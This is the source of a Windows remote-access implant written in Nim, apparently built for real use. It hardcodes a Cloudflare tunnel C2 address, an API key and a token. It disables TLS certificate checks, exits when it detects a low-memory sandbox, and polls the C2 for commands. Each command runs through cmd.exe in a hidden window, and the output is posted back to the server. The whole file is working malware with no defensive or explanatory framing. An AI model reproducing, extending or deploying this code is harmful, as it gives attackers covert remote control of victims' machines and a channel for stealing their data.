# Nim C2 Agent - WinHTTP (no external DLLs needed)
import std/[os, osproc, strutils, random, json]
import winim/lean
import winim/inc/wininet

const C2_URL = "https://mandatory-zip-installing-illinois.trycloudflare.com"
const API_KEY = "964fb7928cd27b5faf3b8971e5befcf6"
const TOKEN = "57c36cda7fe1823797273b065ea3b8f8"

type HINTERNET = pointer

# WinHTTP constants
const
  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0
  WINHTTP_FLAG_SECURE = 0x00800000
  WINHTTP_OPTION_SECURITY_FLAGS = 31
  SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS = 0x00003300

proc WinHttpOpen(pszAgent: LPCWSTR, dwAccessType: DWORD, pszProxy: LPCWSTR, pszProxyBypass: LPCWSTR, dwFlags: DWORD): HINTERNET {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpConnect(hSession: HINTERNET, pswzServerName: LPCWSTR, nServerPort: INTERNET_PORT, dwReserved: DWORD): HINTERNET {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpOpenRequest(hConnect: HINTERNET, pwszVerb: LPCWSTR, pwszObjectName: LPCWSTR, pwszVersion: LPCWSTR, pwszReferrer: LPCWSTR, ppwszAcceptTypes: ptr LPCWSTR, dwFlags: DWORD): HINTERNET {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpSendRequest(hRequest: HINTERNET, lpszHeaders: LPCWSTR, dwHeadersLength: DWORD, lpOptional: LPVOID, dwOptionalLength: DWORD, dwTotalLength: DWORD, dwContext: DWORD_PTR): BOOL {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpReceiveResponse(hRequest: HINTERNET, lpReserved: LPVOID): BOOL {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpReadData(hRequest: HINTERNET, lpBuffer: LPVOID, dwNumberOfBytesToRead: DWORD, lpdwNumberOfBytesRead: LPDWORD): BOOL {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpCloseHandle(hInternet: HINTERNET): BOOL {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpSetOption(hInternet: HINTERNET, dwOption: DWORD, lpBuffer: LPVOID, dwBufferLength: DWORD): BOOL {.stdcall, dynlib: "winhttp", importc.}
proc WinHttpAddRequestHeaders(hRequest: HINTERNET, lpszHeaders: LPCWSTR, dwHeadersLength: DWORD, dwModifiers: DWORD): BOOL {.stdcall, dynlib: "winhttp", importc.}

proc httpGet(url: string, apiKey: string): string =
  result = ""
  
  # Parse URL
  let https = url.startsWith("https://")
  var host, path: string
  var urlPart = if https: url[8..^1] else: url[7..^1]
  let slashPos = urlPart.find('/')
  if slashPos > 0:
    host = urlPart[0..<slashPos]
    path = urlPart[slashPos..^1]
  else:
    host = urlPart
    path = "/"
  
  let port: INTERNET_PORT = if https: 443 else: 80
  
  # Open session
  let hSession = WinHttpOpen(newWideCString("Mozilla/5.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
  if hSession == nil: return
  defer: discard WinHttpCloseHandle(hSession)
  
  # Connect
  let hConnect = WinHttpConnect(hSession, newWideCString(host), port, 0)
  if hConnect == nil: return
  defer: discard WinHttpCloseHandle(hConnect)
  
  # Open request
  var flags: DWORD = 0
  if https: flags = WINHTTP_FLAG_SECURE
  let hRequest = WinHttpOpenRequest(hConnect, newWideCString("GET"), newWideCString(path), nil, nil, nil, flags)
  if hRequest == nil: return
  defer: discard WinHttpCloseHandle(hRequest)
  
  # Ignore SSL errors
  if https:
    var secFlags: DWORD = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
    discard WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, sizeof(secFlags).DWORD)
  
  # Add headers
  let headers = "X-API-Key: " & apiKey & "\r\n"
  discard WinHttpAddRequestHeaders(hRequest, newWideCString(headers), DWORD(-1), 0x20000000)
  
  # Send
  if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: return
  if WinHttpReceiveResponse(hRequest, nil) == 0: return
  
  # Read response
  var buffer: array[4096, char]
  var bytesRead: DWORD
  while WinHttpReadData(hRequest, addr buffer[0], sizeof(buffer).DWORD, addr bytesRead) != 0 and bytesRead > 0:
    for i in 0..<bytesRead.int:
      result.add(buffer[i])

proc httpPost(url: string, apiKey: string, body: string): bool =
  result = false
  
  let https = url.startsWith("https://")
  var host, path: string
  var urlPart = if https: url[8..^1] else: url[7..^1]
  let slashPos = urlPart.find('/')
  if slashPos > 0:
    host = urlPart[0..<slashPos]
    path = urlPart[slashPos..^1]
  else:
    host = urlPart
    path = "/"
  
  let port: INTERNET_PORT = if https: 443 else: 80
  
  let hSession = WinHttpOpen(newWideCString("Mozilla/5.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
  if hSession == nil: return
  defer: discard WinHttpCloseHandle(hSession)
  
  let hConnect = WinHttpConnect(hSession, newWideCString(host), port, 0)
  if hConnect == nil: return
  defer: discard WinHttpCloseHandle(hConnect)
  
  var flags: DWORD = 0
  if https: flags = WINHTTP_FLAG_SECURE
  let hRequest = WinHttpOpenRequest(hConnect, newWideCString("POST"), newWideCString(path), nil, nil, nil, flags)
  if hRequest == nil: return
  defer: discard WinHttpCloseHandle(hRequest)
  
  if https:
    var secFlags: DWORD = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
    discard WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, sizeof(secFlags).DWORD)
  
  let headers = "X-API-Key: " & apiKey & "\r\nContent-Type: application/json\r\n"
  discard WinHttpAddRequestHeaders(hRequest, newWideCString(headers), DWORD(-1), 0x20000000)
  
  let bodyLen = body.len.DWORD
  if WinHttpSendRequest(hRequest, nil, 0, cast[LPVOID](unsafeAddr body[0]), bodyLen, bodyLen, 0) == 0: return
  if WinHttpReceiveResponse(hRequest, nil) == 0: return
  
  result = true

proc runCmd(cmd: string): string =
  result = ""
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = sizeof(STARTUPINFOW).DWORD
  si.dwFlags = STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES
  si.wShowWindow = SW_HIDE
  
  # Create pipes for output
  var hReadPipe, hWritePipe: HANDLE
  var sa: SECURITY_ATTRIBUTES
  sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
  sa.bInheritHandle = TRUE
  
  if CreatePipe(addr hReadPipe, addr hWritePipe, addr sa, 0) == 0:
    return "Pipe error"
  
  si.hStdOutput = hWritePipe
  si.hStdError = hWritePipe
  
  let cmdLine = "cmd.exe /c " & cmd
  const noWindowFlag = 0x08000000.DWORD
  
  if CreateProcessW(nil, newWideCString(cmdLine), nil, nil, TRUE, noWindowFlag, nil, nil, addr si, addr pi) == 0:
    CloseHandle(hReadPipe)
    CloseHandle(hWritePipe)
    return "Exec error"
  
  CloseHandle(hWritePipe)
  
  # Read output
  var buffer: array[4096, char]
  var bytesRead: DWORD
  while ReadFile(hReadPipe, addr buffer[0], sizeof(buffer).DWORD - 1, addr bytesRead, nil) != 0 and bytesRead > 0:
    buffer[bytesRead] = '\0'
    for i in 0..<bytesRead.int:
      result.add(buffer[i])
  
  WaitForSingleObject(pi.hProcess, 30000)
  CloseHandle(hReadPipe)
  CloseHandle(pi.hProcess)
  CloseHandle(pi.hThread)

proc main() =
  sleep(2000)
  
  # Sandbox check
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = cast[DWORD](sizeof(MEMORYSTATUSEX))
  GlobalMemoryStatusEx(addr memStatus)
  if cast[uint64](memStatus.ullTotalPhys) < 2000000000'u64:
    quit(0)
  
  randomize()
  let hostname = getEnv("COMPUTERNAME", "agent")
  let agentId = hostname & "-" & toHex(rand(0xFFFF), 4).toLowerAscii()
  
  let cmdUrl = C2_URL & "/bits/cmd/" & agentId & "?key=" & TOKEN
  let resultUrl = C2_URL & "/bits/result/" & agentId & "?key=" & TOKEN
  
  while true:
    try:
      let resp = httpGet(cmdUrl, API_KEY)
      if resp.len > 0:
        var cmd = ""
        try:
          let j = parseJson(resp)
          if j.hasKey("command") and j["command"].kind != JNull:
            cmd = j["command"].getStr()
        except:
          discard
        
        if cmd.len > 0:
          var output = runCmd(cmd)
          if output.len == 0: output = "[OK]"
          discard httpPost(resultUrl, API_KEY, $(%*{"result": output}))
    except:
      discard
    
    sleep(3000 + rand(2000))

when isMainModule:
  main()
